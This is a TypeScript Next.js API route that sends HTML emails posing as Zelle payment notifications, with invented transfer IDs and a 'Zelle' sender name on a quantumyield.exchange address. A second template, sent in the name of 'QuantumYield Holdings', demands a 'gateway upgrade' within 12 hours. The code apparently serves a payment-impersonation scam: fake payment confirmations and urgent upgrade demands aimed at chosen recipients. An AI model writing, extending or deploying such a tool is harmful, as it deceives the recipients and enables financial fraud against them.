import { NextResponse } from "next/server"
import { Resend } from "resend"
import { generateZelleEmailHtml, generateUpgradeWarningEmail } from "@/lib/email-template"

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const { recipientEmail, recipientName, amount, message, langMode, emailTemplate } = body

    if (!recipientEmail || !recipientName) {
      return NextResponse.json({ error: "Missing required fields" }, { status: 400 })
    }

    // Validate email format
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    if (!emailRegex.test(recipientEmail)) {
      return NextResponse.json({ error: "Invalid email address" }, { status: 400 })
    }

    let emailHtml: string
    let emailSubject: string

    if (emailTemplate === "upgrade-warning") {
      emailHtml = generateUpgradeWarningEmail({
        recipientName,
        institution: "QuantumYield Holdings",
        upgradeDeadline: "within 12 hours",
        supportLink: "https://support.zellepay.com",
      })
      emailSubject = "Important: Gateway Upgrade Required - Action Needed"
    } else {
      if (!amount) {
        return NextResponse.json({ error: "Amount is required for payment emails" }, { status: 400 })
      }

      const amountNum = Number.parseFloat(amount)
      if (isNaN(amountNum) || amountNum <= 0) {
        return NextResponse.json({ error: "Invalid amount" }, { status: 400 })
      }

      const transferId = `ZEL-${Date.now().toString().slice(-6)}-${Math.random().toString(36).substring(2, 9).toUpperCase()}`
      const depositLink = `https://www.zellepay.com/`

      emailHtml = generateZelleEmailHtml({
        recipientName,
        amount: amountNum,
        message,
        transferId,
        depositLink,
        senderName: "QuantumYield Treasury",
        institution: "QuantumYield Holdings | Treasury & Vault Portal",
      })
      emailSubject = `You've received a Zelle payment for $${amountNum.toFixed(2)}`
    }

    if (!process.env.RESEND_API_KEY) {
      return NextResponse.json(
        { error: "Email service not configured. Please add RESEND_API_KEY to environment variables." },
        { status: 500 },
      )
    }

    const resend = new Resend(process.env.RESEND_API_KEY)

    const { error } = await resend.emails.send({
      from: process.env.RESEND_FROM_EMAIL || "Zelle <gateway@quantumyield.exchange>",
      to: recipientEmail,
      subject: emailSubject,
      html: emailHtml,
    })

    if (error) {
      return NextResponse.json({ error: `Failed to send email: ${error.message}` }, { status: 500 })
    }

    return NextResponse.json({ success: true, message: "Email sent successfully" })
  } catch (error) {
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}
